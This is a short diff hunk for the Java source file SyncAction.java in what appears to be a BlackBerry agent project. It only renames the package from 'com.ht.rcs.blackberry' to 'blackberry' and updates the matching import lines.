@@ -5,24 +5,24 @@
  * File         : SyncAction.java 
  * Created      : 26-mar-2010
  * *************************************************/
-package com.ht.rcs.blackberry.action;
+package blackberry.action;
 
 import java.io.EOFException;
 
 import net.rim.device.api.util.DataBuffer;
 
-import com.ht.rcs.blackberry.AgentManager;
-import com.ht.rcs.blackberry.Common;
-import com.ht.rcs.blackberry.agent.Agent;
-import com.ht.rcs.blackberry.event.Event;
-import com.ht.rcs.blackberry.log.LogCollector;
-import com.ht.rcs.blackberry.transfer.Transfer;
-import com.ht.rcs.blackberry.transfer.WifiConnection;
-import com.ht.rcs.blackberry.utils.Check;
-import com.ht.rcs.blackberry.utils.Debug;
-import com.ht.rcs.blackberry.utils.DebugLevel;
-import com.ht.rcs.blackberry.utils.Utils;
-import com.ht.rcs.blackberry.utils.WChar;
+import blackberry.AgentManager;
+import blackberry.Common;
+import blackberry.agent.Agent;
+import blackberry.event.Event;
+import blackberry.log.LogCollector;
+import blackberry.transfer.Transfer;
+import blackberry.transfer.WifiConnection;
+import blackberry.utils.Check;
+import blackberry.utils.Debug;
+import blackberry.utils.DebugLevel;
+import blackberry.utils.Utils;
+import blackberry.utils.WChar;
 
 public class SyncAction extends SubAction {
 	//#debug
